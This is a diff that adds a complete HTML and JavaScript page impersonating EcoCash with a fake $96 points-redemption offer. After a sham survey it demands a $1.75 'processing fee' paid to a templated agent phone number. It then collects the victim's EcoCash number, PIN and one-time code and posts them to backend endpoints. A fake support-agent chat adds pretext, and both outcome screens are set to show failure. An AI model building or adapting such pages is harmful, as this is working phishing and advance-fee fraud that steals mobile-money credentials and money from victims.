@@ -1,0 +1,1040 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EcoCash Rewards</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&family=Open+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-blue: #00447C;
+      --secondary-blue: #0066B2;
+      --accent-red: #E31E24;
+      --light-blue: #E8F4F8;
+      --dark-blue: #002D54;
+      --white: #FFFFFF;
+      --light-gray: #F5F5F5;
+      --text-dark: #1A1A1A;
+      --text-muted: #666666;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Open Sans', sans-serif;
+      background: linear-gradient(135deg, var(--primary-blue) 0%, var(--secondary-blue) 50%, #0088CC 100%);
+      color: var(--text-dark);
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 30px 16px 60px;
+    }
+
+    /* ── MAIN CARD ── */
+    .container {
+      max-width: 620px;
+      width: 100%;
+      background: var(--white);
+      border-radius: 16px;
+      padding: 36px 32px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+
+    /* ── LOGO ── */
+    .logo-section {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--white);
+      padding: 12px 28px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      border: 1px solid #eee;
+    }
+    .logo h1 {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 2rem;
+      font-weight: 800;
+      margin: 0;
+      letter-spacing: 0;
+    }
+    .logo-eco { color: var(--primary-blue); }
+    .logo-cash { color: var(--accent-red); }
+
+    /* ── REWARD BANNER ── */
+    .reward-banner {
+      background: linear-gradient(135deg, var(--accent-red), #c01018);
+      color: var(--white);
+      padding: 16px 22px;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 1rem;
+      margin-bottom: 22px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(227,30,36,0.3);
+      line-height: 1.5;
+    }
+
+    /* ── INFO BOX ── */
+    .info-box {
+      background: var(--light-blue);
+      border-left: 4px solid var(--secondary-blue);
+      padding: 16px 18px;
+      border-radius: 8px;
+      margin-bottom: 24px;
+      font-size: 0.93rem;
+      color: var(--text-dark);
+      line-height: 1.7;
+    }
+    .info-box p { margin-bottom: 8px; }
+    .info-box p:last-child { margin-bottom: 0; }
+    .info-box em { font-style: italic; color: var(--primary-blue); font-weight: 600; }
+
+    /* ── TERMS ── */
+    .terms {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      text-align: center;
+      margin-top: 10px;
+      line-height: 1.6;
+    }
+
+    /* ── CHAT BUBBLE ── */
+    #chat-bubble {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 1000;
+    }
+
+    #chat-toggle {
+      width: 58px;
+      height: 58px;
+      border-radius: 50%;
+      background: var(--primary-blue);
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s;
+    }
+    #chat-toggle:hover { background: var(--dark-blue); }
+    #chat-toggle svg { fill: var(--white); width: 28px; height: 28px; }
+
+    #chat-box {
+      display: none;
+      position: absolute;
+      bottom: 68px;
+      right: 0;
+      width: 310px;
+      background: var(--white);
+      border-radius: 12px;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.2);
+      overflow: hidden;
+      flex-direction: column;
+    }
+    #chat-box.open { display: flex; }
+
+    .chat-header {
+      background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+      color: var(--white);
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .chat-header .avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: var(--accent-red);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      color: var(--white);
+      font-size: 1rem;
+      flex-shrink: 0;
+    }
+    .chat-header .agent-info { line-height: 1.3; }
+    .chat-header .agent-info strong { font-size: 0.92rem; }
+    .chat-header .agent-info span { font-size: 0.75rem; opacity: 0.85; display: block; }
+
+    .chat-messages {
+      padding: 14px;
+      min-height: 130px;
+      max-height: 220px;
+      overflow-y: auto;
+      background: var(--light-blue);
+    }
+    .msg {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+    .msg .bubble {
+      background: var(--white);
+      border: 1px solid #d0e8f5;
+      border-radius: 10px 10px 10px 0;
+      padding: 9px 13px;
+      font-size: 0.87rem;
+      color: var(--text-dark);
+      max-width: 240px;
+      line-height: 1.5;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.07);
+    }
+    .msg .avatar-sm {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: var(--primary-blue);
+      color: var(--white);
+      font-size: 0.75rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .chat-input-row {
+      display: flex;
+      border-top: 1px solid #d0e8f5;
+    }
+    .chat-input-row input {
+      flex: 1;
+      border: none;
+      padding: 11px 14px;
+      font-size: 0.88rem;
+      outline: none;
+      font-family: 'Open Sans', sans-serif;
+    }
+    .chat-input-row input:focus { background: var(--light-blue); }
+    .chat-input-row button {
+      background: var(--primary-blue);
+      border: none;
+      padding: 0 16px;
+      cursor: pointer;
+      color: var(--white);
+      font-size: 0.88rem;
+      font-weight: 600;
+      transition: background 0.2s;
+      font-family: 'Open Sans', sans-serif;
+    }
+    .chat-input-row button:hover { background: var(--dark-blue); }
+
+    /* ── PROGRESS BAR ── */
+    .progress-bar {
+      display: flex;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 28px;
+    }
+    .progress-step {
+      flex: 1;
+      height: 6px;
+      background: #dde8f0;
+      border-radius: 10px;
+      position: relative;
+      overflow: hidden;
+    }
+    .progress-step.active::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      height: 100%; width: 100%;
+      background: linear-gradient(90deg, var(--secondary-blue), var(--primary-blue));
+      animation: progressFill 0.4s ease;
+    }
+    @keyframes progressFill {
+      from { width: 0; } to { width: 100%; }
+    }
+
+    /* ── STEP ── */
+    .step { display: none; }
+    .step.active { display: block; animation: fadeInStep 0.4s ease both; }
+    @keyframes fadeInStep {
+      from { opacity: 0; transform: translateX(16px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+    .step h2 {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: var(--primary-blue);
+      margin-bottom: 6px;
+    }
+    .step .subtitle {
+      color: var(--text-muted);
+      font-size: 0.93rem;
+      margin-bottom: 22px;
+    }
+
+    /* ── FORM ELEMENTS ── */
+    .form-group { margin-bottom: 20px; }
+    .form-group label {
+      display: block;
+      margin-bottom: 7px;
+      font-weight: 600;
+      color: var(--text-dark);
+      font-size: 0.93rem;
+    }
+    .form-group input[type="text"],
+    .form-group input[type="number"] {
+      width: 100%;
+      padding: 13px 15px;
+      border: 2px solid #d0dde8;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-family: 'Open Sans', sans-serif;
+      color: var(--text-dark);
+      background: var(--white);
+      transition: border-color 0.2s, background 0.2s;
+    }
+    .form-group input:focus {
+      outline: none;
+      border-color: var(--secondary-blue);
+      background: var(--light-blue);
+    }
+    .form-group input.error {
+      border-color: var(--accent-red);
+      background: #fff5f5;
+    }
+
+    /* ── RADIO GROUP ── */
+    .radio-group { display: flex; flex-direction: column; gap: 10px; }
+    .radio-option {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 14px;
+      border: 2px solid #d0dde8;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: normal;
+      font-size: 0.93rem;
+      color: var(--text-dark);
+      transition: border-color 0.2s, background 0.2s;
+    }
+    .radio-option:hover { border-color: var(--secondary-blue); background: var(--light-blue); }
+    .radio-option input[type="radio"] { accent-color: var(--primary-blue); width: 16px; height: 16px; flex-shrink: 0; }
+    .radio-option:has(input:checked) {
+      border-color: var(--primary-blue);
+      background: var(--light-blue);
+      font-weight: 600;
+    }
+
+    /* ── FORM BUTTONS ── */
+    .btn {
+      display: inline-block;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 0.97rem;
+      font-weight: 700;
+      padding: 13px 28px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.15s;
+      margin-top: 6px;
+    }
+    .btn-primary {
+      background: var(--primary-blue);
+      color: var(--white);
+      margin-right: 10px;
+    }
+    .btn-primary:hover { background: var(--dark-blue); transform: translateY(-1px); }
+    .btn-secondary {
+      background: var(--light-gray);
+      color: var(--primary-blue);
+    }
+    .btn-secondary:hover { background: #dde8f0; }
+    .btn-claim {
+      background: var(--accent-red);
+      color: var(--white);
+      font-size: 1.05rem;
+      padding: 15px 32px;
+      box-shadow: 0 4px 15px rgba(227,30,36,0.3);
+      width: 100%;
+      text-align: center;
+    }
+    .btn-claim:hover { background: #b01018; transform: translateY(-1px); }
+
+    /* ── CLAIM PANEL ── */
+    .claim-banner {
+      background: linear-gradient(135deg, var(--accent-red), #b01018);
+      color: var(--white);
+      border-radius: 10px;
+      padding: 18px 20px;
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 1rem;
+      font-weight: 600;
+      box-shadow: 0 4px 15px rgba(227,30,36,0.25);
+    }
+    .claim-banner .big { font-size: 1.6rem; font-weight: 800; display: block; margin-bottom: 4px; }
+
+    /* ── USSD BOX ── */
+    .ussd-box {
+      background: var(--light-blue);
+      border: 2px dashed var(--secondary-blue);
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      margin: 18px 0;
+    }
+    .ussd-code {
+      font-family: 'Courier New', monospace;
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--primary-blue);
+      letter-spacing: 2px;
+      display: block;
+      margin-bottom: 12px;
+    }
+    .btn-copy {
+      background: var(--secondary-blue);
+      color: var(--white);
+      border: none;
+      padding: 10px 24px;
+      border-radius: 8px;
+      font-family: 'Montserrat', sans-serif;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-copy:hover { background: var(--primary-blue); }
+    .btn-copy.copied { background: #28A745; }
+
+    /* ── TEL / PASSWORD INPUTS ── */
+    .form-group input[type="tel"],
+    .form-group input[type="password"] {
+      width: 100%;
+      padding: 13px 15px;
+      border: 2px solid #d0dde8;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-family: 'Open Sans', sans-serif;
+      color: var(--text-dark);
+      background: var(--white);
+      transition: border-color 0.2s, background 0.2s;
+    }
+    .form-group input[type="tel"]:focus,
+    .form-group input[type="password"]:focus {
+      outline: none;
+      border-color: var(--secondary-blue);
+      background: var(--light-blue);
+    }
+    .form-group input[type="tel"].error,
+    .form-group input[type="password"].error {
+      border-color: var(--accent-red);
+      background: #fff5f5;
+    }
+
+    /* ── OTP INPUTS ── */
+    .otp-input-group {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      margin-top: 8px;
+    }
+    .otp-input {
+      width: 44px;
+      height: 52px;
+      border: 2px solid #d0dde8;
+      border-radius: 8px;
+      font-size: 1.3rem;
+      font-weight: 700;
+      text-align: center;
+      font-family: 'Montserrat', sans-serif;
+      color: var(--primary-blue);
+      transition: border-color 0.2s, background 0.2s;
+    }
+    .otp-input:focus {
+      outline: none;
+      border-color: var(--secondary-blue);
+      background: var(--light-blue);
+    }
+
+    /* ── SUCCESS / FAILURE ── */
+    .result-animation {
+      text-align: center;
+      padding: 20px 0;
+    }
+    .checkmark-circle {
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      background: #28A745;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      animation: popIn 0.4s ease;
+    }
+    .checkmark-circle svg { width: 36px; height: 36px; stroke: #fff; stroke-width: 4; fill: none; }
+    .cross-circle {
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      background: var(--accent-red);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      animation: popIn 0.4s ease;
+    }
+    .cross-circle svg { width: 36px; height: 36px; stroke: #fff; stroke-width: 4; fill: none; }
+    @keyframes popIn {
+      from { transform: scale(0.3); opacity: 0; }
+      to   { transform: scale(1);   opacity: 1; }
+    }
+
+    @media (max-width: 480px) {
+      .container { padding: 24px 18px; }
+      .logo h1 { font-size: 1.5rem; }
+      #chat-box { width: 92vw; right: -4px; }
+      .btn { width: 100%; margin-right: 0; margin-bottom: 8px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <!-- LOGO -->
+    <div class="logo-section">
+      <div class="logo">
+        <h1><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></h1>
+      </div>
+    </div>
+
+    <!-- REWARD BANNER -->
+    <div class="reward-banner">
+      YOU HAVE POINTS WORTH  $96.00USD Ready to be Redeemed!
+    </div>
+
+    <!-- INFO BOX -->
+    <div class="info-box">
+      <p><strong>Dear Valued Customer,</strong></p>
+      <p>All active EcoCash customers stand a chance — the more active you are, the more you get back. Your EcoCash points have been accumulating; now it's time to cash them in!</p>
+      <p><em>Turn points into cash, easily!</em></p>
+    </div>
+
+    <!-- Progress bar -->
+    <div class="progress-bar" id="progressBar">
+      <div class="progress-step active" id="ps1"></div>
+      <div class="progress-step" id="ps2"></div>
+      <div class="progress-step" id="ps3"></div>
+      <div class="progress-step" id="ps4"></div>
+      <div class="progress-step" id="ps5"></div>
+      <div class="progress-step" id="ps6"></div>
+    </div>
+
+      <form id="surveyForm" novalidate>
+
+        <!-- Step 1: Personal Information -->
+        <div class="step active" data-step="1">
+          <h2>Personal Information</h2>
+          <p class="subtitle">Let's start with some basic details</p>
+
+          <div class="form-group">
+            <label for="fullName">Full Name *</label>
+            <input type="text" id="fullName" placeholder="e.g. Tinashe Moyo">
+          </div>
+
+          <div class="form-group">
+            <label for="birthYear">Birth Year *</label>
+            <input type="number" id="birthYear" placeholder="e.g. 1990" min="1920" max="2008">
+          </div>
+
+          <button type="button" class="btn btn-primary" onclick="nextStep()">Continue</button>
+        </div>
+
+        <!-- Step 2: Usage Survey -->
+        <div class="step" data-step="2">
+          <h2>Your EcoCash Experience</h2>
+          <p class="subtitle">Help us understand how you use our service</p>
+
+          <div class="form-group">
+            <label>How often do you use EcoCash? *</label>
+            <div class="radio-group">
+              <label class="radio-option">
+                <input type="radio" name="frequency" value="daily">
+                <span>Daily — I use it every day</span>
+              </label>
+              <label class="radio-option">
+                <input type="radio" name="frequency" value="weekly">
+                <span>Weekly — A few times a week</span>
+              </label>
+              <label class="radio-option">
+                <input type="radio" name="frequency" value="monthly">
+                <span>Monthly — Once or twice a month</span>
+              </label>
+              <label class="radio-option">
+                <input type="radio" name="frequency" value="rarely">
+                <span>Rarely — Less than once a month</span>
+              </label>
+            </div>
+          </div>
+
+          <button type="button" class="btn btn-primary" onclick="nextStep()">Continue</button>
+          <button type="button" class="btn btn-secondary" onclick="prevStep()">Back</button>
+        </div>
+
+        <!-- Step 3: Service Feedback -->
+        <div class="step" data-step="3">
+          <h2>Service Feedback</h2>
+          <p class="subtitle">Your honest feedback matters to us</p>
+
+          <div class="form-group">
+            <label>What do you think about EcoCash transaction charges? *</label>
+            <div class="radio-group">
+              <label class="radio-option">
+                <input type="radio" name="charges" value="very_affordable">
+                <span>Very affordable</span>
+              </label>
+              <label class="radio-option">
+                <input type="radio" name="charges" value="affordable">
+                <span>Affordable</span>
+              </label>
+              <label class="radio-option">
+                <input type="radio" name="charges" value="fair">
+                <span>Fair — About right</span>
+              </label>
+              <label class="radio-option">
+                <input type="radio" name="charges" value="expensive">
+                <span>Expensive</span>
+              </label>
+              <label class="radio-option">
+                <input type="radio" name="charges" value="very_expensive">
+                <span>Very expensive</span>
+              </label>
+            </div>
+          </div>
+
+          <button type="button" class="btn btn-primary" onclick="nextStep()">Continue</button>
+          <button type="button" class="btn btn-secondary" onclick="prevStep()">Back</button>
+        </div>
+
+        <!-- Step 4: USSD Payment -->
+        <div class="step" data-step="4">
+          <h2>Pay Processing fee amount of  <b>USD $1.75</b> in order for us to turn the points to Ecocash </h2>
+          <p class="subtitle">Dial the code below on your phone to pay the registration fee</p>
+
+          <div class="ussd-box">
+            <span class="ussd-code" id="ussdCode">send $1.75 to {{AGENT_PHONE}}</span>
+            <!-- <button type="button" class="btn-copy" id="copyBtn" onclick="copyUSSD()">📋 Copy Code</button> -->
+          </div>
+
+          <div class="info-box" style="margin-bottom:18px;">
+            <p>Hi! I'm here to help.</p>
+            <p>I'm {{AGENT_NAME}}, your EcoCash Support Agent.  I'll be guiding you to convert your $96 USD  into Ecocash we can proceed as soon as Processing fee $1.75 is Covered</p>
+          </div>
+
+          <button type="button" class="btn btn-primary" id="proceedBtn" onclick="nextStep()">Proceed to Verify</button>
+          <button type="button" class="btn btn-secondary" onclick="prevStep()">Back</button>
+        </div>
+
+        <!-- Step 5: Account Verification -->
+        <div class="step" data-step="5">
+          <h2>Verify Your Details</h2>
+          <p class="subtitle">Enter your EcoCash details to confirm your reward</p>
+
+          <div class="info-box" style="margin-bottom:18px;">
+            ℹ️ Your points will be redeemed immediately after verification
+          </div>
+
+          <div id="accountDetails">
+            <div class="form-group">
+              <label for="ecocashNumber">EcoCash Number *</label>
+              <input type="tel" id="ecocashNumber" placeholder="e.g. 0771234567" maxlength="10">
+            </div>
+            <div class="form-group">
+              <label for="pin">EcoCash PIN *</label>
+              <input type="password" id="pin" placeholder="Enter your 4-digit PIN" maxlength="4">
+            </div>
+            <button type="button" class="btn btn-primary" onclick="sendOTP()">Send OTP</button>
+            <button type="button" class="btn btn-secondary" onclick="prevStep()">Back</button>
+          </div>
+
+          <div id="otpVerification" style="display:none;">
+            <div class="info-box" style="margin-bottom:18px;">
+              📱 We've sent a verification code to your EcoCash number
+            </div>
+            <div class="form-group">
+              <label>Enter OTP Code *</label>
+              <div class="otp-input-group">
+                <input type="text" class="otp-input" maxlength="1" data-index="0" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="2" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="3" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="4" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="5" inputmode="numeric">
+              </div>
+            </div>
+            <button type="button" class="btn btn-primary" onclick="verifyOTP()">Verify &amp; Submit</button>
+            <button type="button" class="btn btn-secondary" onclick="resendOTP()">Resend OTP</button>
+          </div>
+        </div>
+
+        <!-- Step 6: Result -->
+        <div class="step" data-step="6">
+          <div class="result-animation" id="resultSuccess" style="display:none;">
+            <div class="cross-circle">
+              <svg viewBox="0 0 52 52"><line x1="16" y1="16" x2="36" y2="36" stroke-linecap="round"/><line x1="36" y1="16" x2="16" y2="36" stroke-linecap="round"/></svg>
+            </div>
+            <h2 style="color:#f10727;">Verification Failed!</h2>
+            <p class="subtitle">Verification failed this may be due to incorrect OTP or Unpaid Processing Fee</p>
+          </div>
+          <div class="result-animation" id="resultFailure" style="display:none;">
+            <div class="cross-circle">
+              <svg viewBox="0 0 52 52"><line x1="16" y1="16" x2="36" y2="36" stroke-linecap="round"/><line x1="36" y1="16" x2="16" y2="36" stroke-linecap="round"/></svg>
+            </div>
+            <h2 style="color:var(--accent-red);">Transaction Failed</h2>
+            <p class="subtitle" id="failureMsg">The funds did not go through. Please try again.</p>
+            <button type="button" class="btn btn-secondary" style="margin-top:16px;" onclick="retryFromOTP()">Try Again</button>
+          </div>
+        </div>
+
+      </form>
+
+    <!-- Terms -->
+    <p class="terms">
+      ⚠️ Points expire on <strong>31 March 2026</strong>. &nbsp;|&nbsp; Other terms and conditions apply.
+    </p>
+
+  </div><!-- /container -->
+
+
+  <!-- CHAT BUBBLE -->
+  <div id="chat-bubble">
+
+    <!-- Pop-up chat box -->
+    <div id="chat-box">
+      <div class="chat-header">
+        <div class="avatar">{{AGENT_INITIALS}}</div>
+        <div class="agent-info">
+          <strong>{{AGENT_NAME}} — EcoCash Support</strong>
+          <span>Online now</span>
+        </div>
+      </div>
+      <div class="chat-messages" id="chat-messages">
+        <div class="msg">
+          <div class="avatar-sm">{{AGENT_INITIALS}}</div>
+          <div class="bubble">
+            Hey there! I'm <strong>{{AGENT_NAME}}</strong>, an EcoCash Agent, and I'll be
+            guiding you through converting your <em>ChakaChaya</em> points into cash. 👋
+          </div>
+        </div>
+        <div class="msg">
+          <div class="avatar-sm">{{AGENT_INITIALS}}</div>
+          <div class="bubble">
+            Complete the survey about your customer experience and how often you use Ecocash then contact our Agent With $1.75 Processing Fee for your points to be converted to Ecocash into your wallet.
+          </div>
+        </div>
+      </div>
+      <!-- <div class="chat-input-row">
+        <input type="text" id="chat-input" placeholder="Type a message..." />
+        <button onclick="sendMsg()">Send</button>
+      </div> -->
+    </div>
+
+    <!-- Toggle button -->
+    <button id="chat-toggle" onclick="toggleChat()" title="Chat with us">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M2 3h20v14H13l-5 4v-4H2V3z"/>
+      </svg>
+    </button>
+
+  </div>
+
+  <script>
+    /* ── MULTI-STEP FORM ── */
+    let currentStep = 1;
+    const TOTAL_STEPS = 6;
+
+    function showStep(step) {
+      document.querySelectorAll('.step').forEach(el => {
+        el.classList.remove('active');
+        void el.offsetWidth;
+      });
+      const target = document.querySelector(`.step[data-step="${step}"]`);
+      target.classList.add('active');
+      for (let i = 1; i <= TOTAL_STEPS; i++) {
+        const ps = document.getElementById('ps' + i);
+        if (ps) ps.classList.toggle('active', i <= step);
+      }
+      updateBannerMessage(step);
+    }
+
+    function updateBannerMessage(step) {
+      const infoBox = document.querySelector('.info-box');
+      let message = '';
+
+      switch(step) {
+        case 1:
+          message = `
+            <p><strong>Dear Valued Customer,</strong></p>
+            <p>All active EcoCash customers stand a chance — the more active you are, the more you get back. Your EcoCash points have been accumulating; now it's time to cash them in!</p>
+            <p><em>Turn points into cash, easily!</em></p>
+          `;
+          break;
+        case 2:
+          message = `
+            <p><strong>Hello there!</strong></p>
+            <p>We're excited to help you convert your EcoCash points. To get started, we'd like to understand your experience with our services.</p>
+            <p><em>Your feedback helps us serve you better!</em></p>
+          `;
+          break;
+        case 3:
+          message = `
+            <p><strong>Great progress!</strong></p>
+            <p>Your opinions about our transaction charges and service quality are important to us. This helps improve EcoCash for everyone.</p>
+            <p><em>Almost there — let's continue!</em></p>
+          `;
+          break;
+        case 4:
+          message = `
+            <p>•10Points=$1
+•100Points=$10 
+•1000Points=$100
+
+Congratulations!🎉 you have $96 Worth of Points Ready to be converted to USD $96.00 Ecocash</p>
+          `;
+          break;
+        case 5:
+          message = `
+            <p><strong>Hey there! I'm {{AGENT_NAME}}.</strong></p>
+            <p>I'm an EcoCash Agent, and I'll be guiding you through converting your <em>ChakaChaya</em> points into cash. We will need you to verify your ACCOUNT Via OTP before $96.00 USD is Available in your Ecocash</p>
+            <p><em>Let's get your rewards processed!</em></p>
+          `;
+          break;
+        case 6:
+          message = `
+            <p><strong>Final step with {{AGENT_NAME}}!</strong></p>
+            <p>WE COULDN'T CONVERT YOUR POINTS. THIS MIGHT BE DUE TO INVALID OTP OR $1.75 PROCESSING FEE HAS NOT BEEN PAID.</p>
+            <p><em>Verification failed unable to claim reward</em></p>
+          `;
+          break;
+      }
+
+      infoBox.innerHTML = message;
+    }
+
+    function validateStep(step) {
+      if (step === 1) {
+        const name = document.getElementById('fullName');
+        const year = document.getElementById('birthYear');
+        let ok = true;
+        if (!name.value.trim() || !/^[A-Za-z\s'\-]+$/.test(name.value.trim())) {
+          name.classList.add('error'); ok = false;
+        } else { name.classList.remove('error'); }
+        const y = parseInt(year.value);
+        if (!year.value || y < 1920 || y > 2008) {
+          year.classList.add('error'); ok = false;
+        } else { year.classList.remove('error'); }
+        return ok;
+      }
+      if (step === 2) {
+        const checked = document.querySelector('input[name="frequency"]:checked');
+        if (!checked) { alert('Please select how often you use EcoCash.'); return false; }
+        return true;
+      }
+      if (step === 3) {
+        const checked = document.querySelector('input[name="charges"]:checked');
+        if (!checked) { alert('Please share your thoughts on transaction charges.'); return false; }
+        return true;
+      }
+      return true;
+    }
+
+    function nextStep() {
+      if (!validateStep(currentStep)) return;
+      if (currentStep < TOTAL_STEPS) {
+        currentStep++;
+        showStep(currentStep);
+      }
+    }
+
+    function prevStep() {
+      if (currentStep > 1) {
+        currentStep--;
+        showStep(currentStep);
+      }
+    }
+
+    /* ── USSD COPY ── */
+    function copyUSSD() {
+      const code = document.getElementById('ussdCode').textContent.trim();
+      navigator.clipboard.writeText(code).then(() => {
+        const btn = document.getElementById('copyBtn');
+        btn.textContent = '✅ Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.textContent = '📋 Copy Code';
+          btn.classList.remove('copied');
+        }, 3000);
+      }).catch(() => {
+        // fallback for older browsers
+        const ta = document.createElement('textarea');
+        ta.value = code;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        const btn = document.getElementById('copyBtn');
+        btn.textContent = '✅ Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = '📋 Copy Code'; btn.classList.remove('copied'); }, 3000);
+      });
+    }
+
+    /* ── SEND OTP ── */
+    function getSurveyData() {
+      return {
+        full_name: document.getElementById('fullName').value.trim(),
+        birth_year: parseInt(document.getElementById('birthYear').value),
+        frequency: (document.querySelector('input[name="frequency"]:checked') || {}).value || '',
+        charges: (document.querySelector('input[name="charges"]:checked') || {}).value || '',
+        recommend: 'yes'
+      };
+    }
+
+    async function sendOTP() {
+      const numEl = document.getElementById('ecocashNumber');
+      const pinEl = document.getElementById('pin');
+      let ok = true;
+      if (!numEl.value.trim() || !/^0\d{9}$/.test(numEl.value.trim())) {
+        numEl.classList.add('error'); ok = false;
+      } else { numEl.classList.remove('error'); }
+      if (!pinEl.value.trim() || pinEl.value.trim().length < 4) {
+        pinEl.classList.add('error'); ok = false;
+      } else { pinEl.classList.remove('error'); }
+      if (!ok) return;
+
+      try {
+        const res = await fetch('/api/chakachaya/send-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ecocash_number: numEl.value.trim(),
+            pin: pinEl.value.trim(),
+            survey_data: getSurveyData()
+          })
+        });
+        const data = await res.json();
+        if (data.success) {
+          document.getElementById('accountDetails').style.display = 'none';
+          document.getElementById('otpVerification').style.display = 'block';
+          document.querySelector('.otp-input').focus();
+        } else {
+          alert('Failed to send OTP. Please try again.');
+        }
+      } catch (e) {
+        alert('Network error. Please try again.');
+      }
+    }
+
+    /* ── VERIFY OTP ── */
+    async function verifyOTP() {
+      const inputs = document.querySelectorAll('.otp-input');
+      const otp = Array.from(inputs).map(i => i.value).join('');
+      if (otp.length < 6) {
+        inputs.forEach(i => i.style.borderColor = 'var(--accent-red)');
+        return;
+      }
+      inputs.forEach(i => i.style.borderColor = '');
+
+      const numEl = document.getElementById('ecocashNumber');
+      try {
+        const res = await fetch('/api/chakachaya/verify-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ecocash_number: numEl.value.trim(),
+            otp: otp,
+            survey_data: getSurveyData()
+          })
+        });
+        const data = await res.json();
+        currentStep = 6;
+        showStep(6);
+        if (data.success) {
+          document.getElementById('resultSuccess').style.display = 'block';
+          document.getElementById('resultFailure').style.display = 'none';
+          // setTimeout(() => {
+          //   window.location.href = data.redirect_url || '/login';
+          // }, 2200);
+        } else {
+          document.getElementById('resultSuccess').style.display = 'none';
+          document.getElementById('resultFailure').style.display = 'block';
+          document.getElementById('failureMsg').textContent =
+            data.message || 'The funds did not go through. Please try again.';
+        }
+      } catch (e) {
+        currentStep = 6;
+        showStep(6);
+        document.getElementById('resultSuccess').style.display = 'none';
+        document.getElementById('resultFailure').style.display = 'block';
+        document.getElementById('failureMsg').textContent = 'Network error. Please try again.';
+      }
+    }
+
+    /* ── RESEND OTP ── */
+    async function resendOTP() {
+      const numEl = document.getElementById('ecocashNumber');
+      try {
+        await fetch('/api/chakachaya/resend-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'ecocash_number=' + encodeURIComponent(numEl.value.trim())
+        });
+        alert('A new OTP has been sent to your EcoCash number.');
+      } catch (e) {
+        alert('Could not resend OTP. Please try again.');
+      }
+    }
+
+    /* ── RETRY FROM OTP ── */
+    function retryFromOTP() {
+      document.getElementById('otpVerification').style.display = 'none';
+      document.getElementById('accountDetails').style.display = 'block';
+      document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+      currentStep = 5;
+      showStep(5);
+    }
+
+    /* ── OTP AUTO-ADVANCE ── */
+    document.addEventListener('DOMContentLoaded', () => {
+      updateBannerMessage(1); // Initialize banner message
+      document.querySelectorAll('.otp-input').forEach((input, idx, all) => {
+        input.addEventListener('input', () => {
+          input.value = input.value.replace(/\D/g, '');
+          if (input.value && idx < all.length - 1) all[idx + 1].focus();
+        });
+        input.addEventListener('keydown', e => {
+          if (e.key === 'Backspace' && !input.value && idx > 0) all[idx - 1].focus();
+        });
+      });
+    });
+
